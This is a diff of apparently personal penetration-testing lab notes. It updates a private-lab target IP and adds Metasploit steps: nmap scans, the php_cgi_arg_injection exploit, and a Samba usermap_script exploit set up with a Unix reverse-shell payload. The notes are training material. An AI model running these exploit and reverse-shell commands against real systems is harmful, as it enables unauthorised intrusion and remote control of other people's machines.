@@ -45,7 +45,7 @@ $ cd /usr/share/metasploit-framework/modules/exploits/windows/smb
 
 ## 1. BruteForcing SSH with Metasploits
 
-192.168.71.131
+192.168.83.131
 
 ```bash
 # IN Nmap Terminal
@@ -83,7 +83,7 @@ _Done_
 
 ```bash
 
-$ nmap -sV -p 80 192.168.71.131
+$ nmap -sV -p 80 192.168.83.131
 # 80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
 
 $ search http_ver
@@ -91,23 +91,23 @@ $ search http_ver
 
 $ use auxiliary/scanner/http/http_version
 $ show options
-$ set RHOSTS 192.168.71.131
+$ set RHOSTS 192.168.83.131
 $ run
-# 192.168.71.131:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )
+# 192.168.83.131:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )
 
 # Check Version on <Target_IP>/phpinfo
 
 # Exploit
 $ search dir_scanner
 $ use auxiliary/scanner/http/dir_scanner
-$ set RHOST 192.168.71.131
+$ set RHOST 192.168.83.131
 $ run
 
 # Search for Configuration File (php.ini) Path : /etc/php5/cgi
 $ search php_cgi
 $ use exploit/multi/http/php_cgi_arg_injection
 $ show options
-$ set RHOST 192.168.71.131
+$ set RHOST 192.168.83.131
 $ exploit
 
 ```
@@ -129,3 +129,37 @@ $ show options
 
 ## 4. Getting Meterpreter with command Injection
 
+---
+
+## 5. Metasploit Injection Payload Samba
+
+```bash
+
+$ nmap -sV -p- <Target_ip>
+$ msfconsole -q
+$ search samba
+$ use exploit/multi/samba/usermap_script
+$ show options
+$ set RHOST 192.168.83.131
+$ show payloads
+$ set payload payload/cmd/unix/reverse
+$ show options
+$ run
+
+```
+
+---
+
+## 6. Wine Installation
+
+```bash
+$ apt install wine -y
+$ dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+$ wget https://www.python.org/ftp/python/2.7.14/python-2.7.14.msi
+$ wine msiexec /i python-2.7.14.msi
+$ ls -la
+```
+
+---
+
+## 7. Creating windows payload with MSFvenom
